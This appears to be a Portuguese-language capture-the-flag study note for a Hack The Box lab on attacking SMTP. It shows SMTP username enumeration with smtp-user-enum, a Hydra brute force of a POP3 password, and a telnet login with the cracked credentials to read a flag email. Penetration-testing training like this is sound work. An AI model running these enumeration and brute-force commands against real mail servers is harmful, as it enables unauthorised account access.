> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/attacking-common-services/smtp/questions.md).

# Questions

1. Qual é o nome de usuário disponível para o domínio inlanefreight.htb no servidor SMTP?

* Payload&#x20;

```sh
smtp-user-enum -M RCPT -U /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -D inlanefreight.htb -t 10.129.149.216 
```

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FmoQz8OpyCeWNMvuPSxeW%2Fimage.png?alt=media&amp;token=c1a09f2b-021c-4cff-9463-a115f91a582c" alt=""><figcaption></figcaption></figure>

2. Acesse a conta de e-mail usando as credenciais de usuário que você descobriu e envie o sinalizador no e-mail como sua resposta.

* Brute force no e-mail encontrado para descobrir a senha&#x20;

```sh
hydra -l marlin@inlanefreight.htb -P pws.list pop3://10.129.149.216 -t 10
```

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FRBATybPf5tVo2zC9zQFG%2Fimage.png?alt=media&amp;token=ecc052bf-01f5-4583-908b-30cd4450fe1c" alt=""><figcaption></figcaption></figure>

* Login via Telnet&#x20;

```
telnet 10.129.149.216 110
USER marlin@inlanefreight.htb
Pass poohbear
```

* Usar o comando `LIST` para listar todos os e-mails enviados&#x20;

```
LIST
+OK 1 messages (601 octets)
1 601
.
```

* Notamos que existe uma mensagem enviada para um cliente
* Usar o comando `RETR` seguido pelo número da mensagem. No seu caso, o número da mensagem é 1:

```
RETR 1

+OK 601 octets
Return-Path: marlin@inlanefreight.htb
Received: from [10.10.14.33] (Unknown [10.10.14.33])
	by WINSRV02 with ESMTPA
	; Wed, 20 Apr 2022 14:49:32 -0500
Message-ID: <85cb72668d8f5f8436d36f085e0167ee78cf0638.camel@inlanefreight.htb>
Subject: Password change
From: marlin <marlin@inlanefreight.htb>
To: administrator@inlanefreight.htb
Cc: marlin@inlanefreight.htb
Date: Wed, 20 Apr 2022 15:49:11 -0400
Content-Type: text/plain; charset="UTF-8"
User-Agent: Evolution 3.38.3-1 
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit

Hi admin,

How can I change my password to something more secure? 

flag: HTB{w34k_p4$$w0rd}
```
